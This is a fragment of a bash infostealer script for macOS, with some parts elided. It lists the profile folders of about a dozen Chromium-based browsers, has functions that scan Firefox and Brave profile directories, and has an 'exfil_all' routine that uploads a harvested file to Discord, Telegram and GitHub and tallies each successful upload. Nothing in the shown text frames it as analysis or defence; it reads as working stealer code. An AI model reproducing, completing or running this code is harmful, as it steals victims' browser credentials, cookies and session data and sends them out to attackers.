...
blist() {
  local b="$HOME/Library/Application Support"
  printf '%s\n' \
    "Chrome|$b/Google/Chrome" \
    "Chrome Canary|$b/Google/Chrome Canary" \
    "Brave|$b/BraveSoftware/Brave-Browser" \
    "Edge|$b/Microsoft Edge" \
    "Opera|$b/com.operasoftware.Opera" \
    "Opera GX|$b/com.operasoftware.OperaGX" \
    "Vivaldi|$b/Vivaldi" \
    "Arc|$b/Arc/User Data" \
    "Yandex|$b/Yandex/YandexBrowser" \
    "Thorium|$b/Thorium" \
    "Chromium|$b/Chromium"
}
...
firefox_scan() {
  for base in \
    ...
    [[ -d "$base" ]] || continue
    local lbl; lbl=$(basename "$(dirname "$base")")
    while IFS= read -r -d '' pd; do
...
brave_builtin() {
  local bp="$HOME/Library/Application Support/BraveSoftware/Brave-Browser"
  [[ -d "$bp" ]] || return 0
  while IFS= read -r -d '' pd; do
...
exfil_all() {
  ...
  echo -n "  → Discord... "
  exfil_discord "$file" && { echo "✅"; ((success++)); } || echo "❌"
  echo -n "  → Telegram... "
  exfil_telegram "$file" && { echo "✅"; ((success++)); } || echo "❌"
  echo -n "  → GitHub... "
  exfil_github "$file" && { echo "✅"; ((success++)); } || echo "❌"
